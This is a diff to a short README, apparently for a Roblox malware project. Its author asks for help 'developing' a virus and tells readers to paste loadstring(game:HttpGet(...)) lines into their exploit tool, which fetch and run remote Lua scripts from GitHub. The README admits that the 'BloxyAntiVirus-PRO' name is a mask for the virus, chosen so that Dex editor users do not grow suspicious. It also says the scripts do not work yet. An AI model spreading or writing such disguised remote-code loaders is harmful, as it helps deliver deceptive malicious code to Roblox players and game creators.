@@ -6,7 +6,9 @@ and please help me in the virus developing
 
 How to use?
 Copy in your exploit the loadstring :
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/ELJOKER900/Roblox-END/main/BLoxyAntiVirus-PRO.Lua'), game.ReplicatedFirst)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ELJOKER900/Roblox-END-RoJack-/main/BloxyAntiVirus-PRO.lua'), game.ReplicatedFirst)
+and
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ELJOKER900/Roblox-END/main/AntiFLY.Lua'), game.ReplicatedFirst)
 
 (WARNING, SCRIPTS DOES NOT WORKS BECAUSE IM SEARCHING THE BEST SCRIPT INIT , PLEASE WAIT)
 (and the "AntiVirus" not is an antivirus , It is the mask of the virus, which makes no one with the Dex editor suspicious)
